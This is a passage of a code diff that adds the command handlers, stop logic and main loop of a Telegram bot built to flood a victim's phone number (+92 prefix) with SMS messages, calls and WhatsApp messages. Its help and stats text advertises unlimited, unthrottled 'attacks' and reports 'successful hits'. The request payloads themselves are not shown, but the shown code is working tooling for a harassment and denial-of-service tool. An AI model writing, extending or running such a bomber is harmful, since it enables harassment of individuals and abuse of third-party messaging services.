@@ -571,3 +571,182 @@ async def bombing_loop(context: ContextTypes.DEFAULT_TYPE, user_id: int):
                 logger.error(f"Error in bombing loop: {e}")
                 await asyncio.sleep(2)
     except asyncio.Cancel
+        pass
+    finally:
+        user_data['loop_active'] = False
+        user_data['bombing'] = False
+
+async def ask_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    phone = update.message.text.strip()
+    if len(phone) != 10 or not phone.isdigit():
+        await update.message.reply_text("❌ Invalid phone number!")
+        return PHONE
+
+    context.user_data['phone'] = phone
+    context.user_data['loop_active'] = True
+    context.user_data['bombing_count'] = 0
+    context.user_data['wave_count'] = 0
+    
+    bomb_type = context.user_data.get('bomb_type', 'all')
+    is_super = context.user_data.get('is_super', False)
+    
+    if is_super:
+        intensity_text = "3X DEVASTATING POWER 💥"
+    else:
+        intensity_text = "CONTINUOUS ASSAULT ⚡"
+    
+    await update.message.reply_text(f"⚡ **INITIALIZING {intensity_text}** on +92{phone}...")
+    
+    # Run the bombing loop in the background
+    task = asyncio.create_task(bombing_loop(context, update.effective_user.id))
+    context.user_data['bombing_task'] = task
+    
+    return BOMBING
+
+async def stop_bomb(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Stop the ongoing bombing attack immediately"""
+    user_data: Dict[str, Any] = context.user_data
+    
+    user_data['loop_active'] = False
+    
+    task = user_data.get('bombing_task')
+    if task:
+        task.cancel()
+        try:
+            await task
+        except asyncio.CancelledError:
+            pass
+    
+    total_hits = user_data.get('bombing_count', 0)
+    total_waves = user_data.get('wave_count', 0)
+    phone = user_data.get('phone', 'N/A')
+    bomb_type = user_data.get('bomb_type', 'all')
+    
+    stop_msg = f"""
+╔════════════════════════════════════════╗
+║ 🛑 ATTACK TERMINATED 🛑                ║
+╚════════════════════════════════════════╝
+
+📊 **FINAL ATTACK STATISTICS:**
+
+🎯 Target: `+92{phone}`
+⚡ Attack Type: `{bomb_type.upper()}`
+🌊 Total Waves: `{total_waves}`
+✅ Total Successful Hits: `{total_hits}`
+
+✅ All operations stopped!
+Ready for new commands!
+    """
+    
+    await update.message.reply_text(stop_msg, parse_mode="Markdown")
+    user_data['bombing'] = False
+    return ConversationHandler.END
+
+async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    help_text = """
+╔════════════════════════════════════════════╗
+║           🛠️ HELP & COMMANDS 🛠️            ║
+╚════════════════════════════════════════════╝
+
+**🎯 ATTACK COMMANDS:**
+
+💣 /bomb - Combined attack (all types)
+📱 /wp_bomb - WhatsApp-only assault  
+💬 /sms_bomb - SMS-only flooding
+📞 /call_bomb - Voice call-only
+⚡ /super_destruction - ALL MODES AT ONCE
+
+**📋 INFO COMMANDS:**
+
+/help - This help menu
+/ping - Latency check
+/stats - System stats
+
+**⚙️ HOW IT WORKS:**
+
+1️⃣ Choose attack type
+2️⃣ Enter target number (10 digits)
+3️⃣ Watch the destruction!
+
+**⚠️ SYSTEM INFO:**
+
+• UNLIMITED requests per session 🔓
+• NO LIMITS on intensity 💪
+• All logs kept secure
+• Use responsibly
+
+Ready to destroy? 🚀
+    """
+    await update.message.reply_text(help_text, parse_mode="Markdown")
+
+async def ping_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    start_time = time.time()
+    msg = await update.message.reply_text("🏓 `Pinging...`", parse_mode="Markdown")
+    latency = (time.time() - start_time) * 1000
+
+    ping_text = f"""
+╔═══════════════════════════════════╗
+║ 🏓 PING CHECK SUCCESSFUL ✅       ║
+╚════════════════════════════════════╝
+
+⚡ Response Time: `{latency:.2f}ms`
+🟢 Bot Status: **ONLINE**
+📡 Signal: **STRONG**
+🚀 Ready for attacks!
+    """
+    await msg.edit_text(ping_text, parse_mode="Markdown")
+
+async def stats_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    total_apis = len(API_CONFIGS)
+    stats_text = f"""
+📊 **SYSTEM STATISTICS** 📊
+
+✅ **Services Status:**
+📡 Total APIs: `{total_apis}`
+🟢 SMS APIs: `Active`
+🟢 Call APIs: `Active`
+🟢 WhatsApp APIs: `Active`
+
+🤖 **Bot Info:**
+🚀 Performance: `High Intensity`
+⚡ Mode: `Continuous Assault`
+🔓 Limits: `None (Unlimited)`
+
+🔥 **Bot is running at peak capacity!**
+    """
+    await update.message.reply_text(stats_text, parse_mode="Markdown")
+
+def main():
+    import pytz
+    from apscheduler.schedulers.asyncio import AsyncIOScheduler
+    
+    # Explicitly set timezone to UTC from pytz to satisfy apscheduler
+    scheduler = AsyncIOScheduler(timezone=pytz.utc)
+    app = Application.builder().token(TOKEN).job_queue(None).build()
+    
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("help", help_cmd))
+    app.add_handler(CommandHandler("ping", ping_cmd))
+    app.add_handler(CommandHandler("stats", stats_cmd))
+    
+    conv_handler = ConversationHandler(
+        entry_points=[
+            CommandHandler("bomb", bomb_start),
+            CommandHandler("wp_bomb", wp_bomb_start),
+            CommandHandler("sms_bomb", sms_bomb_start),
+            CommandHandler("call_bomb", call_bomb_start),
+            CommandHandler("super_destruction", super_destruction),
+        ],
+        states={
+            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_count)],
+            BOMBING: [CommandHandler("stop", stop_bomb)],
+        },
+        fallbacks=[CommandHandler("stop", stop_bomb)],
+    )
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(conv_handler)
+    app.run_polling()
+
+if __name__ == '__main__':
+    main()
+                        
